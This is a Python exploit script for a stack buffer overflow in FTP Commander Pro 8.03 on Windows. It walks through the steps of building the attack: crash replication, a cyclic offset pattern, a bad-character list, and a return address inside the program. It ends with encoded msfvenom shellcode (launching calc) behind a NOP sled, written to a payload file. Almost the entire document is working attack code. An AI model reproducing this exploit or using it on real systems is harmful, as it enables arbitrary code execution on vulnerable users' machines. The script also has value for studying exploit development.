#!/usr/bin/python3

# FTP Commander Pro 8.03
# Original exploit and vulnerable app available at: https://www.exploit-db.com/exploits/47775
# Exploit tested on Windows XP Pro SP3 FR / Windows 10.0.18363.778 Pro EN

# msfvenom -p windows/exec CMD=calc -e x86/alpha_mixed -f python -v shellcode
shellcode =  b""
shellcode += b"\x89\xe7\xd9\xec\xd9\x77\xf4\x5e\x56\x59\x49"
shellcode += b"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43"
shellcode += b"\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50"
shellcode += b"\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
shellcode += b"\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38"
shellcode += b"\x41\x42\x75\x4a\x49\x39\x6c\x6a\x48\x4b\x32"
shellcode += b"\x67\x70\x55\x50\x75\x50\x71\x70\x4d\x59\x4b"
shellcode += b"\x55\x30\x31\x6b\x70\x62\x44\x4e\x6b\x72\x70"
shellcode += b"\x34\x70\x4e\x6b\x61\x42\x64\x4c\x6e\x6b\x32"
shellcode += b"\x72\x56\x74\x6c\x4b\x62\x52\x65\x78\x34\x4f"
shellcode += b"\x6c\x77\x70\x4a\x36\x46\x74\x71\x6b\x4f\x6c"
shellcode += b"\x6c\x75\x6c\x45\x31\x51\x6c\x34\x42\x46\x4c"
shellcode += b"\x51\x30\x49\x51\x5a\x6f\x46\x6d\x46\x61\x5a"
shellcode += b"\x67\x6b\x52\x68\x72\x30\x52\x32\x77\x4e\x6b"
shellcode += b"\x70\x52\x42\x30\x4e\x6b\x31\x5a\x57\x4c\x4e"
shellcode += b"\x6b\x32\x6c\x74\x51\x33\x48\x4a\x43\x47\x38"
shellcode += b"\x46\x61\x6b\x61\x52\x71\x4e\x6b\x76\x39\x47"
shellcode += b"\x50\x76\x61\x59\x43\x4c\x4b\x32\x69\x74\x58"
shellcode += b"\x68\x63\x37\x4a\x37\x39\x4c\x4b\x35\x64\x4e"
shellcode += b"\x6b\x53\x31\x78\x56\x64\x71\x69\x6f\x6c\x6c"
shellcode += b"\x6f\x31\x48\x4f\x74\x4d\x43\x31\x48\x47\x34"
shellcode += b"\x78\x39\x70\x63\x45\x7a\x56\x45\x53\x53\x4d"
shellcode += b"\x68\x78\x45\x6b\x53\x4d\x54\x64\x53\x45\x58"
shellcode += b"\x64\x51\x48\x6e\x6b\x46\x38\x31\x34\x37\x71"
shellcode += b"\x38\x53\x63\x56\x6e\x6b\x46\x6c\x52\x6b\x4e"
shellcode += b"\x6b\x30\x58\x65\x4c\x67\x71\x4b\x63\x6c\x4b"
shellcode += b"\x65\x54\x4e\x6b\x35\x51\x78\x50\x6b\x39\x51"
shellcode += b"\x54\x55\x74\x57\x54\x53\x6b\x53\x6b\x53\x51"
shellcode += b"\x43\x69\x63\x6a\x70\x51\x4b\x4f\x59\x70\x43"
shellcode += b"\x6f\x63\x6f\x32\x7a\x6e\x6b\x34\x52\x58\x6b"
shellcode += b"\x6c\x4d\x31\x4d\x32\x4a\x37\x71\x6e\x6d\x6b"
shellcode += b"\x35\x6d\x62\x35\x50\x37\x70\x77\x70\x30\x50"
shellcode += b"\x71\x78\x35\x61\x4c\x4b\x62\x4f\x6b\x37\x69"
shellcode += b"\x6f\x48\x55\x4f\x4b\x5a\x50\x4e\x55\x79\x32"
shellcode += b"\x62\x76\x62\x48\x39\x36\x5a\x35\x6d\x6d\x6d"
shellcode += b"\x4d\x49\x6f\x6a\x75\x57\x4c\x66\x66\x61\x6c"
shellcode += b"\x44\x4a\x6b\x30\x39\x6b\x59\x70\x34\x35\x55"
shellcode += b"\x55\x6f\x4b\x72\x67\x52\x33\x50\x72\x32\x4f"
shellcode += b"\x61\x7a\x47\x70\x52\x73\x79\x6f\x68\x55\x30"
shellcode += b"\x63\x45\x31\x50\x6c\x55\x33\x75\x50\x41\x41"

#Step 1: Replicate the crash
buffer = b"A"*4112
#=> At crash EAX point to our buffer

#Step 2: Find the offset
buffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh"

#Step 3: Check the offset
buffer = b"A"*4108 + b"BBBB"
"""
#Step 3: Check the offset (SEH overwrite)
buffer = b"A"*780 + b"BBBB" + b"CCCC"
buffer += b"D"*(4000-len(buffer))
"""
#Step 4: Find the badchars -> \x00\x0a\x0d\x1a\x1b\x1c\x1d\x1e\x1f - maybe stuff in \x20 to \x2f - \x80 - \x82 to \x8c - \x8e - \x91 to \9x -\x9e\x9f - \xc2 to \xff
badchars = b""
badchars += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19"
badchars += b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1"
buffer = b"A"*4108 + b"BBBB" + badchars + b"C"*100

#Step 5: Check for 3 bytes overwrite
# 0x00447443 : '\xFF\x20' | startnull,asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [ftpcomm.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v7.67.0.50 (C:\Program Files\FTP Commander\ftpcomm.exe)
buffer = b"A"*4108 + b"\x43\x74\x44"

#Step 6: Exploit
buffer = b"\x90"*50 + shellcode
buffer += b"A"*(4108-len(buffer))
buffer += b"\x43\x74\x44"


file = open("ftpcommander-noseh-exploit.txt", "wb")
file.write(buffer)
file.close()
